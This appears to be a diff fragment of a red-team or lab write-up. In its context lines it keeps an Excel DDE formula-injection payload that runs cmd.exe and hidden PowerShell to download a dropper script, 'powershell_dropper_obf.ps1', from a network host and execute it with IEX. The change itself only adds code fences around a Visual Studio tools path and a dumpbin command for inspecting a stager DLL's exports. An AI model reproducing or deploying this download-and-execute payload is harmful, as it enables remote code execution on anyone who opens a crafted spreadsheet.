@@ -72,7 +72,10 @@ For my purpose i finally used the following cell formula (taken from [https://bl
 ```
 =MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c powershell.exe -nop -w 1 $e=(New-Object System.Net.WebClient).DownloadString(\"http://192.168.1.24/powershell_dropper_obf.ps1\"); IEX $e'!'A1'
 ```
-
+```C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.25.28610\bin\Hostx64\x64
+```
+```
 dumpbin -exports stager.dll 查看dll导出函数
+```
 Cheers,
   
